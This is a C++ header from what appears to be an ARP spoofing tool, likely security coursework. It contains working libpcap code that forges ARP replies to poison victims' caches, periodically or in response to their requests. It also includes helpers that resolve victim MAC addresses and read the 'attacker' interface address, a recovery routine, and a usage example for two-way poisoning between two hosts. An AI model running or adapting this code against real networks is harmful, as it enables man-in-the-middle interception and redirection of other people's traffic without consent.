#pragma once
#include "needed.h"

void usage()
{
    printf("arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sudo ./arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void sig_handler(int signo)
{
	if(signo == SIGINT)
    {
        chk_val = 0;
		signal(SIGINT,SIG_DFL);	//make sigint default
    }
}

void init_arp(EthArpPacket& packet,Mac dmac, Mac smac_e, Mac smac_a, Ip sip, Mac tmac, Ip tip,uint16_t mode)
{
    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac_e;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(mode);
    packet.arp_.smac_ = smac_a;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);
}

void send_arp(pcap_t *handle,EthArpPacket& packet)
{
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
}

const u_char * read_packet(pcap_t* handle)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    Pthread_mutex_lock(&mutex);
    int res = pcap_next_ex(handle, &header, &packet);
    Pthread_mutex_unlock(&mutex);
    if (res == 0) return NULL;
    if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
    {
        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        return NULL;
    }
    return packet;
}

void arp_infection(void* arg)
{
    Spoof_arg sarg = *(Spoof_arg*) arg; //because of call by reference while thread
    Sem_post(&sem);

    EthArpPacket p;
    init_arp(p,sarg.s_mac, sarg.a_mac, sarg.a_mac ,sarg.t_ip, sarg.s_mac, sarg.s_ip, ArpHdr::Reply);
    if(sarg.status == P)
    {
        while(chk_val)
        {
            //cout << pthread_self() << " : " <<string(sarg.t_ip) << endl;
            send_arp(sarg.handle,p);
            sleep(PERIOD);
        }
    }
    else if(sarg.status == NP)
    {
        /*
            1. ARP Request
            AND
            2. tip == target ip
            OR
            3. sip == sender ip or target ip --> because sender could learn by arp req
        */
        struct pcap_pkthdr *header;
        const u_char *packet;
        ArpHdr arp;
        while(chk_val)
        {
            packet = read_packet(sarg.handle);
            if (packet != NULL)
            {
                memcpy(&arp, packet + ETHER_HDR_LEN, sizeof(arp));
                if (arp.op_ == htons(ArpHdr::Request) && (arp.tip() == sarg.t_ip || (arp.sip() == sarg.s_ip || arp.sip() == sarg.t_ip)))
                {
                    send_arp(sarg.handle,p);
                }
            }
        }
    }
}

Mac resolve_mac_by_arp(pcap_t *handle, Mac a_mac, Ip a_ip, Ip t_ip)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    Mac broadcast = Mac::broadcastMac();
    Mac lookup = Mac::nullMac();
    int cnt = 0;
    while(cnt < 3)
    {
        EthArpPacket p;
        init_arp(p,broadcast, a_mac, a_mac, a_ip, lookup, t_ip, ArpHdr::Request);
        send_arp(handle, p);

        ArpHdr arp;
        time_t sT = time(NULL);
        while (true)
        {
            time_t eT = time(NULL);
            double time = (double)(eT-sT);
            if(time>3.0)
            {
                cnt++;
                break;
            }
            packet = read_packet(handle);
            if (packet != NULL)
            {
                memcpy(&arp, packet + ETHER_HDR_LEN, sizeof(arp));
                Ip chk_a_ip(a_ip);
                Mac chk_a_mac(a_mac);
                Ip chk_t_ip(t_ip);
                if (arp.op_ == htons(ArpHdr::Reply) && chk_a_ip == arp.tip() && chk_t_ip == arp.sip() && chk_a_mac == arp.tmac())
                    return arp.smac();
            }
        }
    }
    return lookup;
}

Mac get_attacker_mac(const char *dev)
{
    char buf[MAC_LEN + 1] = {0};

    int len = strlen(dev);
    int sz = len + 24; //NULL considered
    char *path = (char *)malloc(sz);
    if (path == NULL)
    {
        perror("path malloc failed");
        exit(-1);
    }

    snprintf(path, sz, "%s%s%s", "/sys/class/net/", dev, "/address");
    int fd = open(path, O_RDONLY);
    if (fd == -1)
    {
        perror("open failed");
        exit(-1);
    }

    int bytes = read(fd, buf, MAC_LEN);
    if (bytes != MAC_LEN)
    {
        fprintf(stderr, "mac addr read failed");
        free(path);
        close(fd);
    }

    free(path);
    close(fd);
    return Mac(buf);
}

Ip get_attacker_ip(const char *dev)
{
    struct ifreq ifr;
    char buf[IP_LEN+1] = {0};

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s == -1)
    {
        perror("socket creation failed");
        exit(-1);
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ioctl error");
        close(s);
        exit(-1);
    }
    else
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data + sizeof(u_short),buf,sizeof(struct sockaddr));

    close(s);
    return Ip(buf);
}

STATUS rt_func(void* arg)
{
    Resolve_arg tmp = *((Resolve_arg*)arg);
    Sem_post(&sem);
    Mac ret = resolve_mac_by_arp(tmp.handle,tmp.a_mac,tmp.a_ip,tmp.ip);
    if(ret == Mac::nullMac())
    {
        printf("TIMEOUT : %s resolving failed..\n",string(tmp.ip).c_str());
        return NO;
    }
    *(tmp.ans) = ret;
    return OK;
}

void recover(void* arg)
{
    Relay_arg rarg = *((Relay_arg*)arg);
    Sem_post(&sem);
    //cout << pthread_self() << " : " <<string(rarg.p.arp_.tip_) << endl;
    send_arp(rarg.handle,rarg.p);
}